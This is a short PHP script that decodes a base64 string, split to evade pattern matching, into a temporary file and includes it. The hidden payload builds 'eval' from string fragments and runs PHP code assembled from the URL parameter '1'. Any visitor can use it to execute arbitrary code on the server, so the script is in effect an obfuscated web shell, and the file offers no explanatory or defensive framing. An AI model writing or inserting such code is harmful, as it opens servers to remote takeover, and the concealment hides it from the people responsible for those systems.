<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z48P3BocAokeT0iYWwiOyR6PSJzdCI7JHU9ImV2IjsKJHQ9Y3JlYXRlX2Z1bmN0aW9uKCckeCcsICJ7JHV9eyR5fShcJHgpOyIpOwppZiAoIWlzc2V0KCRfR0VUWzFdKSkKCSR0KCJlY2hvIGh0bWxlbnRpdGllcygnYSZiJyk7Iik7CmVsc2UKCSR0KCJlY2hvIGh0bWxlbnRpdGllcygneyRfR0VUWzFdfScpOyIpOwo=');
file_put_contents($tmp, $c);
include $tmp;
